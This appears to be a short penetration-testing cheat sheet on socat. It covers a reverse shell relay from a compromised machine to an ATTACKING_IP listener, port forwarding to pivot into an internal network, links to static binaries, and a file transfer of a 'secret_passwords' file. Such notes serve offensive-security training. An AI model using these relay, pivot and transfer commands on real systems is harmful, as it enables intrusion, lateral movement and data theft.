### socat  

## Reverse Shell Relay  

After setting up a listener on the attacker machine e.g.  

`nc -lvnp 443`  

A reverse shell relay can be created on the compromised machine to pivot into a previous unreachable network.  

`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`  

## Port Forward  

Compromised server is 172.0.0.5:33060 and the target is 172.16.0.10:3306.

`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`

## Static Binaries.  


Static Linux binary.  

https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat  

Static Windows binary.  

https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download  

## Connect.  

Connect to a server on port 80.  

`socat - TCP4:<REMOTE SERVER IP>:80`  

Set up a listener on port 443, sudo is required on ports below 1024.  

`sudo socat TCP4-LISTEN:443 STDOUT`  

## File Transfers.  

To set up a listener to share a file, fork creates a child process allowing multiple connections.  

`sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt`  

Retrieve the above file.  

`socat TCP4:<REMOTE IP ADDRESS>:443 file:received_secret_passwords.txt,create`  

